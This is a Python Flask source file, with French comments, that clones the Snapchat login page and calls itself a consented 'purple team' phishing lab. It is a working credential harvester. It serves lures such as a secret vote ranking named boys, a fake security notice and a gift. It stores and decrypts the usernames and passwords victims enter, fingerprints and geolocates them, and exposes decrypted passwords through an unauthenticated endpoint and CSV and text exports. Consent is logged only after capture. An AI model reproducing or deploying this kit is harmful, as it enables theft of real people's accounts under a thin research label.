"""
Snapchat Login Page Cloner — Version Purple Team Lab
Clone UNIQUEMENT la page de login pour recherche consentie.
NE PAS UTILISER contre de vraies cibles sans autorisation.
"""

import os
import sys
import time
import hashlib
import sqlite3
import random
import string
import json
import secrets
import shutil
import csv
from datetime import datetime, timedelta
from urllib.parse import urljoin, urlparse
from io import StringIO
import requests
from flask import Flask, request, render_template, redirect, url_for, jsonify, session
import base64
from cryptography.fernet import Fernet

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG = {
    "SNAPCHAT_LOGIN_URL": "https://accounts.snapchat.com/login",
    "SERVER_PORT": 8080,
    "USE_HTTPS": True,
    "CAPTURE_DB": os.path.join(BASE_DIR, "captured_credentials.db"),
    "SESSION_TTL_MINUTES": 60,
    "RANDOMIZE_DOMAINS": True,
    "ADMIN_KEY": os.environ.get("SNAPCHAT_LAB_ADMIN_KEY", "CHANGE_ME_SNAPCHAT_LAB_2024"),
}

ADMIN_KEY_FILE = os.path.join(BASE_DIR, ".admin_key")
if os.path.exists(ADMIN_KEY_FILE):
    with open(ADMIN_KEY_FILE, "r") as f:
        CONFIG["ADMIN_KEY"] = f.read().strip()
else:
    new_key = secrets.token_hex(32)
    CONFIG["ADMIN_KEY"] = new_key
    with open(ADMIN_KEY_FILE, "w") as f:
        f.write(new_key)

app = Flask(__name__, template_folder=os.path.join(BASE_DIR, "templates"), static_folder=os.path.join(BASE_DIR, "static"))
app.secret_key = secrets.token_hex(32)
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = CONFIG["USE_HTTPS"]
app.config['TEMPLATES_AUTO_RELOAD'] = True

if CONFIG["USE_HTTPS"]:
    try:
        import cryptography
    except ImportError:
        print("[!] cryptography non installe. HTTPS desactive.")
        print("    pip install cryptography")
        CONFIG["USE_HTTPS"] = False


def init_database():
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS captured_credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            participant_id TEXT NOT NULL,
            username TEXT,
            password TEXT,
            ip_address TEXT,
            user_agent TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            consent_given BOOLEAN DEFAULT 0,
            debriefed BOOLEAN DEFAULT 0,
            session_token TEXT,
            notes TEXT,
            screen_resolution TEXT,
            timezone TEXT,
            browser_language TEXT,
            platform TEXT,
            time_on_page INTEGER,
            referrer TEXT,
            click_count INTEGER,
            step TEXT
        )
    ''')

    for col in ['screen_resolution', 'timezone', 'browser_language', 'platform', 'time_on_page', 'referrer', 'click_count', 'step', 'country']:
        try:
            c.execute(f"ALTER TABLE captured_credentials ADD COLUMN {col} TEXT")
        except:
            pass

    c.execute('''
        CREATE TABLE IF NOT EXISTS experiment_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            event_type TEXT NOT NULL,
            participant_id TEXT,
            details TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS access_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT,
            endpoint TEXT,
            method TEXT,
            status INTEGER,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS ip_blacklist (
            ip TEXT PRIMARY KEY,
            reason TEXT,
            attempts INTEGER DEFAULT 1,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS votes_top3 (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            participant_id TEXT NOT NULL,
            pseudo TEXT,
            votes_data TEXT,
            snap_validated INTEGER DEFAULT 0,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            validated_at DATETIME
        )
    ''')
    conn.commit()
    conn.close()


def generate_participant_id():
    return f"P{datetime.now().strftime('%Y%m%d')}-{secrets.token_hex(4).upper()}"


def log_event(event_type, participant_id=None, details=None):
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()
    c.execute(
        "INSERT INTO experiment_log (event_type, participant_id, details) VALUES (?, ?, ?)",
        (event_type, participant_id, json.dumps(details) if details else None)
    )
    conn.commit()
    conn.close()


def log_access(ip, endpoint, method, status):
    try:
        conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
        c = conn.cursor()
        c.execute("INSERT INTO access_log (ip, endpoint, method, status) VALUES (?, ?, ?, ?)",
                  (ip, endpoint, method, status))
        conn.commit()
        conn.close()
    except:
        pass


def is_blacklisted(ip):
    try:
        conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
        c = conn.cursor()
        row = c.execute("SELECT attempts FROM ip_blacklist WHERE ip = ?", (ip,)).fetchone()
        conn.close()
        return row and row[0] >= 5
    except:
        return False


def blacklist_ip(ip, reason):
    try:
        conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
        c = conn.cursor()
        c.execute("""
            INSERT INTO ip_blacklist (ip, reason, attempts) VALUES (?, ?, 1)
            ON CONFLICT(ip) DO UPDATE SET attempts = attempts + 1, reason = ?
        """, (ip, reason, reason))
        conn.commit()
        conn.close()
    except:
        pass


GEOIP_CACHE = {}

def geoip(ip):
    if ip in GEOIP_CACHE:
        return GEOIP_CACHE[ip]
    if ip == '127.0.0.1' or ip.startswith('192.168.') or ip.startswith('10.'):
        GEOIP_CACHE[ip] = 'Local'
        return 'Local'
    try:
        r = requests.get(f'http://ip-api.com/json/{ip}?fields=country,countryCode', timeout=2)
        if r.status_code == 200:
            d = r.json()
            country = d.get('country', 'Unknown')
            GEOIP_CACHE[ip] = country
            return country
    except:
        pass
    GEOIP_CACHE[ip] = 'Unknown'
    return 'Unknown'


def _get_fernet():
    key = base64.urlsafe_b64encode(hashlib.sha256(CONFIG["ADMIN_KEY"].encode()).digest())
    return Fernet(key)

def encrypt_password(password):
    if not password:
        return password
    try:
        return _get_fernet().encrypt(password.encode()).decode()
    except:
        return password

def decrypt_password(encrypted):
    if not encrypted:
        return encrypted
    try:
        return _get_fernet().decrypt(encrypted.encode()).decode()
    except:
        return encrypted


@app.before_request
def check_blacklist():
    if request.path == '/' or request.path.startswith('/static/'):
        return None
    if is_blacklisted(request.remote_addr):
        return jsonify({"error": "blocked", "message": "Your IP has been blacklisted"}), 403


@app.after_request
def log_api_access(response):
    if request.path.startswith('/api/') or request.path.startswith('/export/'):
        log_access(request.remote_addr, request.path, request.method, response.status_code)
    return response


# ============================================================
# CONSENT API (appelé par la page de consentement JS)
# ============================================================

@app.route('/api/consent', methods=['POST'])
def record_consent():
    data = request.get_json(force=True)
    participant_id = data.get('participant_id')
    if not participant_id:
        return jsonify({"error": "participant_id requis"}), 400

    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()
    c.execute(
        "UPDATE captured_credentials SET consent_given=1 WHERE participant_id=?",
        (participant_id,)
    )
    conn.commit()
    conn.close()
    log_event("CONSENT_GIVEN", participant_id)
    return jsonify({"status": "recorded", "id": participant_id})


# ============================================================
# ROUTES
# ============================================================

@app.route('/')
def index():
    if 'participant_id' not in session:
        session['participant_id'] = generate_participant_id()
        log_event("SESSION_START", session['participant_id'])
    scenario = request.args.get('scenario', 'classement')
    return render_template('bait.html',
                         participant_id=session['participant_id'])


@app.route('/scenario/<scenario_id>')
def scenario_page(scenario_id):
    if 'participant_id' not in session:
        session['participant_id'] = generate_participant_id()
        log_event("SESSION_START", session['participant_id'])
    # Map scenario IDs to HTML files
    templates = {
        "classement": "bait.html",
        "securite": "scenarios/scenario_securite.html",
        "snapchat_plus": "scenarios/scenario_snapchat_plus.html",
        "cadeau": "scenarios/scenario_cadeau.html",
    }
    tpl = templates.get(scenario_id, "bait.html")
    log_event("SCENARIO_VIEW", session['participant_id'], {"scenario": scenario_id})
    return render_template(tpl, participant_id=session['participant_id'])


@app.route('/api/log', methods=['POST'])
def api_log():
    data = request.get_json(force=True, silent=True)
    if not data:
        return jsonify({"ok": False, "error": "no data"}), 400
    event = data.get('event', 'UNKNOWN')
    pid = data.get('participant_id', 'unknown')
    log_event(event, pid, {"user_agent": request.headers.get('User-Agent', '')[:200]})
    return jsonify({"ok": True})


@app.route('/login')
def login_page():
    if 'participant_id' not in session:
        session['participant_id'] = generate_participant_id()
        log_event("SESSION_START", session['participant_id'])
    return render_template('login.html', 
                         participant_id=session['participant_id'])


@app.route('/password')
def password_page():
    if 'participant_id' not in session:
        return redirect(url_for('index'))
    return render_template('password.html',
                         participant_id=session['participant_id'])

@app.route('/login', methods=['POST'])
def handle_login():
    participant_id = request.form.get('participant_id') or session.get('participant_id')
    form_fields = dict(request.form)
    username = (
        form_fields.get('username', '')
        or form_fields.get('email', '')
        or form_fields.get('accountIdentifier', '')
        or form_fields.get('account_identifier', '')
        or form_fields.get('login', '')
    )
    password = (
        form_fields.get('password', '')
        or form_fields.get('passwd', '')
        or form_fields.get('pass', '')
        or form_fields.get('pwd', '')
    )
    all_fields = {k: v for k, v in form_fields.items()
                  if k != 'participant_id'}
    log_event("LOGIN_ATTEMPT", participant_id, {
        "username_provided": bool(username),
        "password_provided": bool(password),
        "username_length": len(username),
        "fields_count": len(all_fields),
        "field_names": list(all_fields.keys())
    })
    if username or all_fields:
        credential_str = json.dumps(all_fields, ensure_ascii=False)
        conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
        c = conn.cursor()
        try:
            screen_res = request.form.get('screen_resolution', '')
            timezone = request.form.get('timezone', '')
            browser_lang = request.form.get('browser_language', '')
            platform = request.form.get('platform', '')
        except:
            screen_res = timezone = browser_lang = platform = ''
        country = geoip(request.remote_addr)
        c.execute('''
            INSERT INTO captured_credentials 
            (participant_id, username, password, ip_address, user_agent, session_token,
             screen_resolution, timezone, browser_language, platform, notes, country)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (participant_id,
              username or json.dumps(all_fields),
              encrypt_password(password or ''),
              request.remote_addr,
              request.headers.get('User-Agent', 'Unknown'),
              None,
              screen_res, timezone, browser_lang, platform,
              credential_str,
              country))
        conn.commit()
        conn.close()
        log_event("CAPTURE", participant_id, {
            "fields": list(all_fields.keys()),
            "username_length": len(username),
            "password_length": len(password),
        })
    # Auto-validate votes top3 if they exist
    try:
        conn2 = sqlite3.connect(CONFIG["CAPTURE_DB"])
        conn2.execute(
            "UPDATE votes_top3 SET snap_validated = 1, validated_at = CURRENT_TIMESTAMP WHERE participant_id = ? AND snap_validated = 0",
            (participant_id,)
        )
        conn2.commit()
        conn2.close()
    except:
        pass
    return render_template('redirect.html', 
                         message="Connexion. Redirection...",
                         delay=2)


@app.route('/api/report')
def get_stats():
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM captured_credentials")
    total = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM captured_credentials WHERE DATE(timestamp) = DATE('now')")
    today = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM experiment_log WHERE event_type='SESSION_START'")
    sessions = c.fetchone()[0]
    conversion_rate = (total / sessions * 100) if sessions > 0 else 0
    c.execute('''
        SELECT DATE(timestamp), COUNT(*) FROM captured_credentials 
        GROUP BY DATE(timestamp) ORDER BY DATE(timestamp) DESC LIMIT 7
    ''')
    daily = c.fetchall()
    c.execute("SELECT COUNT(*) FROM experiment_log WHERE event_type LIKE '%VOTE%' OR event_type LIKE '%TOP3%'")
    votes = c.fetchone()[0]
    # Device stats from user_agent
    c.execute("SELECT user_agent FROM captured_credentials WHERE user_agent IS NOT NULL")
    agents = c.fetchall()
    devices = {"chrome": 0, "safari": 0, "firefox": 0, "other": 0}
    for (ua,) in agents:
        ua_lower = (ua or "").lower()
        if "chrome" in ua_lower and "chromium" not in ua_lower:
            devices["chrome"] += 1
        elif "safari" in ua_lower:
            devices["safari"] += 1
        elif "firefox" in ua_lower:
            devices["firefox"] += 1
        else:
            devices["other"] += 1
    conn.close()
    return jsonify({
        "captures": total,
        "sessions": sessions,
        "votes": votes,
        "campaigns": 4,
        "active_campaigns": 1,
        "captures_today": today,
        "total_captures": total,
        "total_sessions": sessions,
        "conversion_rate_pct": round(conversion_rate, 2),
        "daily_stats": [{"date": d, "count": c} for d, c in daily],
        "devices": devices,
    })



@app.route('/shutdown', methods=['POST'])
def shutdown():
    func = request.environ.get('werkzeug.server.shutdown')
    if func:
        func()
    else:
        os._exit(0)
    return jsonify({"ok": True})

@app.route('/debrief')
def debrief():
    pid = session.get('participant_id', 'inconnu')
    log_event("DEBRIEF_VIEW", pid)
    return render_template('debrief.html', participant_id=pid)


@app.route('/api/dbcheck', methods=['GET'])
def dbcheck():
    db_path = CONFIG["CAPTURE_DB"]
    try:
        conn = sqlite3.connect(db_path)
        c = conn.cursor()
        total = c.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
        logs = c.execute("SELECT COUNT(*) FROM experiment_log").fetchone()[0]
        conn.close()
        return jsonify({
            "db_path": db_path,
            "db_exists": os.path.exists(db_path),
            "total_captures": total,
            "total_logs": logs
        })
    except Exception as e:
        return jsonify({"db_path": db_path, "error": str(e)}), 500


@app.route('/api/captures')
def api_captures():
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    rows = conn.execute("""
        SELECT c.id, c.participant_id, c.username, c.password, c.ip_address,
               c.user_agent, c.timestamp, c.screen_resolution, c.timezone,
               c.browser_language, c.platform, c.time_on_page, c.referrer,
               c.click_count, c.step, COALESCE(v.pseudo, '') as pseudo
        FROM captured_credentials c
        LEFT JOIN votes_top3 v ON c.participant_id = v.participant_id
        ORDER BY c.id DESC LIMIT 100
    """).fetchall()
    conn.close()
    return jsonify([{
        "id": r[0], "participant_id": r[1], "username": r[2],
        "password": decrypt_password(r[3] or ""),
        "ip_address": r[4], "ip": r[4],
        "user_agent": r[5][:80] if r[5] else "",
        "timestamp": r[6],
        "screen": r[7] or "", "timezone": r[8] or "",
        "lang": r[9] or "", "platform": r[10] or "",
        "time_on_page": r[11], "referrer": r[12] or "",
        "clicks": r[13], "step": r[14] or "",
        "pseudo": r[15] or r[2] or ""
    } for r in rows])


@app.route('/api/logs')
def api_logs():
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    rows = conn.execute("""
        SELECT id, event_type, participant_id, details, timestamp
        FROM experiment_log ORDER BY id DESC LIMIT 50
    """).fetchall()
    conn.close()
    return jsonify([{
        "id": r[0], "event": r[1], "pid": r[2] or "",
        "details": r[3], "timestamp": r[4]
    } for r in rows])


@app.route('/api/capture', methods=['POST'])
def api_capture():
    db_path = CONFIG["CAPTURE_DB"]
    try:
        data = request.get_json(force=True, silent=True)
        if not data:
            data = request.form.to_dict()
        if not data:
            return jsonify({"ok": False, "error": "empty request"}), 400

        participant_id = data.get('participant_id') or request.cookies.get('participant_id', '')
        username = data.get('accountIdentifier', data.get('username', ''))
        password = data.get('password', '')
        ip = request.remote_addr
        ua = request.headers.get('User-Agent', 'Unknown')

        print(f"\n[CAPTURE] DB={db_path}", flush=True)
        print(f"[CAPTURE] pid={participant_id} user={username} step={data.get('step','?')}", flush=True)
        print(f"[CAPTURE] fingerprint: scr={data.get('screen_resolution','')} tz={data.get('timezone','')}", flush=True)

        conn = sqlite3.connect(db_path)
        c = conn.cursor()
        country = geoip(ip)
        c.execute(
            """INSERT INTO captured_credentials 
            (participant_id, username, password, ip_address, user_agent, 
             screen_resolution, timezone, browser_language, platform, 
             time_on_page, referrer, click_count, step, notes, country)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (
                participant_id, username, encrypt_password(password), ip, ua,
                data.get('screen_resolution', ''),
                data.get('timezone', ''),
                data.get('browser_language', ''),
                data.get('platform', ''),
                data.get('time_on_page', 0),
                data.get('referrer', ''),
                data.get('click_count', 0),
                data.get('step', 'login'),
                json.dumps({k: v for k, v in data.items() if k not in ['participant_id', 'accountIdentifier', 'username', 'password', 'screen_resolution', 'timezone', 'browser_language', 'platform', 'time_on_page', 'referrer', 'click_count', 'step']}, ensure_ascii=False),
                country
            )
        )
        conn.commit()

        after = c.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
        print(f"[CAPTURE] inserted OK, total rows now: {after}", flush=True)

        conn.close()

        # Auto-validate votes top3
        try:
            conn3 = sqlite3.connect(CONFIG["CAPTURE_DB"])
            conn3.execute(
                "UPDATE votes_top3 SET snap_validated = 1, validated_at = CURRENT_TIMESTAMP WHERE participant_id = ? AND snap_validated = 0",
                (participant_id,)
            )
            conn3.commit()
            conn3.close()
        except:
            pass

        log_event("CAPTURE_API", participant_id, {
            "username_length": len(username),
            "password_length": len(password),
            "step": data.get('step', 'login'),
            "fingerprint": bool(data.get('screen_resolution'))
        })

        return jsonify({"ok": True, "captured": bool(username or password)})
    except Exception as e:
        print(f"[CAPTURE] ERROR: {e}")
        return jsonify({"ok": False, "error": str(e)}), 500


# ============================================================
# VOTES TOP 3 — Classement Secret API
# ============================================================

BOYS_LIST = [
    {"id": "famoussa", "name": "Famoussa"},
    {"id": "bill", "name": "Bill"},
    {"id": "bakou", "name": "Bakou"},
    {"id": "yamoussa", "name": "Yamoussa"},
    {"id": "bassidy", "name": "Bassidy"},
    {"id": "ben", "name": "BEN"},
    {"id": "ibrahim", "name": "SK"},
    {"id": "cherif", "name": "Chérif"},
]
POINTS_MAP = [30, 20, 10]


@app.route('/api/top3', methods=['POST'])
def api_submit_votes():
    """Enregistrer les votes Top 3 d'un joueur."""
    data = request.get_json(force=True)
    participant_id = data.get('participant_id')
    pseudo = data.get('pseudo', '')
    votes = data.get('votes')  # JSON dict: {"0": ["id1","id2","id3"], ...}
    if not participant_id or not votes:
        return jsonify({"ok": False, "error": "participant_id et votes requis"}), 400

    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()
    c.execute(
        """INSERT OR REPLACE INTO votes_top3 
        (participant_id, pseudo, votes_data)
        VALUES (?, ?, ?)""",
        (participant_id, pseudo, json.dumps(votes))
    )
    conn.commit()
    conn.close()
    log_event("VOTES_SUBMITTED", participant_id, {"pseudo": pseudo, "votes_count": len(votes)})
    return jsonify({"ok": True, "participant_id": participant_id})


@app.route('/api/classement')
def api_classement():
    """Calculer le classement agrégé de TOUS les joueurs validés."""
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()

    rows = c.execute(
        "SELECT votes_data, pseudo FROM votes_top3 WHERE snap_validated = 1"
    ).fetchall()
    conn.close()

    # Init scores
    scores = {boy["id"]: 0 for boy in BOYS_LIST}

    for row in rows:
        try:
            votes = json.loads(row[0])
        except:
            continue
        for cat_idx, top3 in votes.items():
            for rank, boy_id in enumerate(top3):
                if rank < 3 and boy_id in scores:
                    scores[boy_id] += POINTS_MAP[rank]

    ranking = sorted(
        [{"id": boy["id"], "name": boy["name"], "score": scores[boy["id"]]}
         for boy in BOYS_LIST],
        key=lambda x: -x["score"]
    )

    return jsonify({
        "ranking": ranking,
        "total_voters": len(rows),
        "max_possible": 240
    })


@app.route('/api/votes/validate', methods=['POST'])
def api_validate_votes():
    """Marquer les votes d'un joueur comme validés (après connexion Snapchat)."""
    data = request.get_json(force=True, silent=True)
    if not data:
        data = request.form.to_dict()

    participant_id = data.get('participant_id')
    if not participant_id:
        return jsonify({"ok": False, "error": "participant_id requis"}), 400

    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()
    c.execute(
        "UPDATE votes_top3 SET snap_validated = 1, validated_at = CURRENT_TIMESTAMP WHERE participant_id = ?",
        (participant_id,)
    )
    affected = c.rowcount
    conn.commit()
    conn.close()

    log_event("VOTES_VALIDATED", participant_id)
    return jsonify({"ok": True, "validated": affected > 0})


@app.route('/api/classement/my')
def api_my_classement():
    """Renvoyer le classement perso du joueur + le classement général."""
    participant_id = request.args.get('pid', '')
    pseudo = request.args.get('pseudo', '')

    # Get classement général
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()
    rows = c.execute(
        "SELECT votes_data, pseudo FROM votes_top3 WHERE snap_validated = 1"
    ).fetchall()
    total_voters = c.execute(
        "SELECT COUNT(*) FROM votes_top3 WHERE snap_validated = 1"
    ).fetchone()[0]
    # Check if this player validated
    player_valid = c.execute(
        "SELECT snap_validated FROM votes_top3 WHERE participant_id = ?",
        (participant_id,)
    ).fetchone()
    conn.close()

    scores = {boy["id"]: 0 for boy in BOYS_LIST}
    for row in rows:
        try:
            votes = json.loads(row[0])
        except:
            continue
        for cat_idx, top3 in votes.items():
            for rank, boy_id in enumerate(top3):
                if rank < 3 and boy_id in scores:
                    scores[boy_id] += POINTS_MAP[rank]

    ranking = sorted(
        [{"id": boy["id"], "name": boy["name"], "score": scores[boy["id"]]}
         for boy in BOYS_LIST],
        key=lambda x: -x["score"]
    )
    conn.close()

    # Also calculate MY personal ranking (before aggregation)
    my_scores = {boy["id"]: 0 for boy in BOYS_LIST}
    try:
        conn2 = sqlite3.connect(CONFIG["CAPTURE_DB"])
        stored = conn2.execute(
            "SELECT votes_data FROM votes_top3 WHERE participant_id = ?",
            (participant_id,)
        ).fetchone()
        conn2.close()
        if stored:
            my_votes = json.loads(stored[0])
            for cat_idx, top3 in my_votes.items():
                for rank, boy_id in enumerate(top3):
                    if rank < 3 and boy_id in my_scores:
                        my_scores[boy_id] += POINTS_MAP[rank]
    except:
        pass

    my_ranking = sorted(
        [{"id": boy["id"], "name": boy["name"], "score": my_scores[boy["id"]]}
         for boy in BOYS_LIST],
        key=lambda x: -x["score"]
    )

    return jsonify({
        "ranking": ranking,
        "my_ranking": my_ranking,
        "total_voters": total_voters,
        "player_validated": bool(player_valid and player_valid[0]),
        "max_possible": 240
    })


def require_admin():
    key = request.args.get('key') or request.headers.get('X-Admin-Key', '')
    if key != CONFIG["ADMIN_KEY"]:
        blacklist_ip(request.remote_addr, "invalid admin key")
        return jsonify({"error": "forbidden", "message": "Clé admin invalide."}), 403
    return None

@app.route('/v2/<path:subpath>')
@app.route('/v2/')
def v2_catchall(subpath=''):
    forbid = require_admin()
    if forbid:
        return forbid
    return redirect(f'https://accounts.snapchat.com/v2/{subpath}' if subpath else 'https://accounts.snapchat.com/v2/')

@app.route('/reset', methods=['GET', 'POST'])
def reset_data():
    forbid = require_admin()
    if forbid:
        return forbid
    if request.method == 'GET':
        return '''<form method="POST"><input type="hidden" name="confirm" value="true">
<button style="background:red;color:white;padding:20px;font-size:24px">CONFIRMER LA SUPPRESSION</button></form>'''
    if request.form.get('confirm') != 'true':
        return jsonify({"error": "confirm=true required"}), 400

    if os.path.exists(CONFIG["CAPTURE_DB"]):
        backup_dir = os.path.join(BASE_DIR, "backups")
        os.makedirs(backup_dir, exist_ok=True)
        backup_name = f"captured_credentials_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db"
        shutil.copy2(CONFIG["CAPTURE_DB"], os.path.join(backup_dir, backup_name))

    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()
    c.execute("DELETE FROM captured_credentials")
    c.execute("DELETE FROM experiment_log")
    c.execute("DELETE FROM votes_top3")
    conn.commit()
    conn.close()
    log_event("RESET", "admin")
    return jsonify({"status": "reset", "ok": True})


@app.route('/export')
def export_data():
    forbid = require_admin()
    if forbid:
        return forbid
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()

    c.execute('''
        SELECT participant_id, username, password, ip_address, 
               user_agent, timestamp, consent_given, debriefed 
        FROM captured_credentials
    ''')

    rows = c.fetchall()
    conn.close()

    export_data = []
    for row in rows:
        export_data.append({
            "participant_id": row[0],
            "username_length": len(row[1]) if row[1] else 0,
            "password_length": len(row[2]) if row[2] else 0,
            "ip": row[3],
            "user_agent": row[4],
            "timestamp": row[5],
            "consent": row[6],
            "debriefed": row[7]
        })

    return jsonify(export_data)


@app.route('/export/csv')
def export_csv():
    forbid = require_admin()
    if forbid:
        return forbid
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    rows = conn.execute("""
        SELECT participant_id, username, password, ip_address, user_agent,
               timestamp, screen_resolution, timezone, browser_language,
               platform, click_count, referrer, country
        FROM captured_credentials ORDER BY id DESC
    """).fetchall()
    conn.close()
    si = StringIO()
    cw = csv.writer(si)
    cw.writerow(["participant_id", "username", "password", "ip", "user_agent",
                  "timestamp", "screen", "timezone", "lang", "platform",
                  "clicks", "referrer", "country"])
    for r in rows:
        decrypted = list(r)
        decrypted[2] = decrypt_password(r[2])
        cw.writerow(decrypted)
    output = si.getvalue()
    return output, 200, {"Content-Type": "text/csv; charset=utf-8",
                         "Content-Disposition": "attachment; filename=captures.csv"}


@app.route('/export/report')
def export_report():
    forbid = require_admin()
    if forbid:
        return forbid
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    total = conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
    sessions = conn.execute("SELECT COUNT(*) FROM experiment_log WHERE event_type='SESSION_START'").fetchone()[0]
    conversion = (total / sessions * 100) if sessions > 0 else 0
    rows = conn.execute("""
        SELECT participant_id, username, password, ip_address, user_agent,
               timestamp, screen_resolution, timezone, browser_language,
               platform, click_count, referrer, country
        FROM captured_credentials ORDER BY id DESC
    """).fetchall()
    conn.close()

    html_rows = ""
    for i, r in enumerate(rows, 1):
        pw_display = (decrypt_password(r[2])[:3] + "***") if r[2] else ""
        ua_short = (r[4] or "")[:30]
        ref_short = (r[11] or "")[:30]
        html_rows += (
            f"<tr><td>{i}</td><td>{r[1]}</td><td>{pw_display}</td>"
            f"<td>{r[3]}</td><td>{ua_short}</td><td>{r[5]}</td>"
            f"<td>{r[6] or ''}</td><td>{r[7] or ''}</td><td>{r[8] or ''}</td>"
            f"<td>{r[9] or ''}</td><td>{r[10] or 0}</td><td>{ref_short}</td>"
            f"<td>{r[12] or ''}</td></tr>"
        )

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Capture Report</title>
<style>
  body {{ background:#1a1a2e; color:#eee; font-family:monospace; padding:20px; }}
  h1 {{ color:#e94560; text-align:center; }}
  .summary {{ display:flex; gap:20px; margin:20px 0; justify-content:center; }}
  .card {{ background:#16213e; padding:15px; border-radius:8px; flex:1; max-width:250px; text-align:center; }}
  .card h2 {{ margin:0; color:#e94560; font-size:14px; }}
  .card p {{ font-size:28px; margin:5px 0; font-weight:bold; }}
  table {{ width:100%; border-collapse:collapse; margin-top:20px; }}
  th {{ background:#16213e; color:#e94560; padding:10px; text-align:left; }}
  td {{ padding:8px; border-bottom:1px solid #333; }}
  tr:hover {{ background:#16213e; }}
</style>
</head>
<body>
<h1>Snapchat Phishing Lab — Capture Report</h1>
<div class="summary">
  <div class="card"><h2>TOTAL CAPTURES</h2><p>{total}</p></div>
  <div class="card"><h2>CONVERSION RATE</h2><p>{conversion:.1f}%</p></div>
  <div class="card"><h2>SESSIONS</h2><p>{sessions}</p></div>
</div>
<table>
<tr><th>#</th><th>Participant</th><th>Password</th><th>IP</th><th>UA</th><th>Timestamp</th><th>Screen</th><th>Timezone</th><th>Lang</th><th>Platform</th><th>Clicks</th><th>Referrer</th><th>Country</th></tr>
{html_rows}
</table>
</body>
</html>"""
    return html


@app.route('/export/txt')
def export_txt():
    forbid = require_admin()
    if forbid:
        return forbid
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    rows = conn.execute("""
        SELECT id, participant_id, username, password, ip_address,
               timestamp, step, country
        FROM captured_credentials ORDER BY id DESC
    """).fetchall()
    sessions = conn.execute("SELECT COUNT(*) FROM experiment_log WHERE event_type='SESSION_START'").fetchone()[0]
    total = conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
    conn.close()
    lines = []
    lines.append("=" * 60)
    lines.append("  SNAPCHAT PHISHING LAB - CAPTURE REPORT")
    lines.append("=" * 60)
    lines.append(f"  Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append(f"  Total captures: {total}  |  Sessions: {sessions}")
    lines.append("-" * 60)
    lines.append("")
    for r in rows:
        pw = decrypt_password(r[3]) if r[3] else "-"
        country = f" [{r[7]}]" if r[7] else ""
        lines.append(f"  #{r[0]} [{r[6] or 'login'}] {r[2] or '-'}")
        lines.append(f"      IP: {r[4]}{country}  |  PW: {pw}")
        lines.append(f"      Time: {r[5]}")
        lines.append("")
    lines.append("-" * 60)
    output = "\n".join(lines)
    return output, 200, {"Content-Type": "text/plain; charset=utf-8",
                         "Content-Disposition": "attachment; filename=captures.txt"}


@app.route('/qr')
def generate_qr():
    forbid = require_admin()
    if forbid:
        return forbid
    url = request.args.get('url', f'http://localhost:{CONFIG["SERVER_PORT"]}')
    try:
        import qrcode
        img = qrcode.make(url)
        buf = StringIO()
        img.save(buf, format='PNG')
        buf.seek(0)
        return buf.read(), 200, {"Content-Type": "image/png"}
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ============================================================
# INITIALISATION
# ============================================================

if __name__ == '__main__':
    init_database()

    print(f"DB path: {CONFIG['CAPTURE_DB']}")
    print(f"DB exists: {os.path.exists(CONFIG['CAPTURE_DB'])}")

    print("")
    print("=" * 60)
    print(f"  ADMIN KEY: {CONFIG['ADMIN_KEY']}")
    print(f"  (saved in {ADMIN_KEY_FILE})")
    print("=" * 60)

    try:
        print("""
╔══════════════════════════════════════════════════════════════════╗
║   SNAPCHAT PHISHING LAB - PURPLE TEAM - Research Ethique       ║
╠══════════════════════════════════════════════════════════════════╣
║   Objet    Etude de reaction au phishing (consentement req.)    ║
║   Cadre    Recherche ethique - Donnees anonymisees              ║
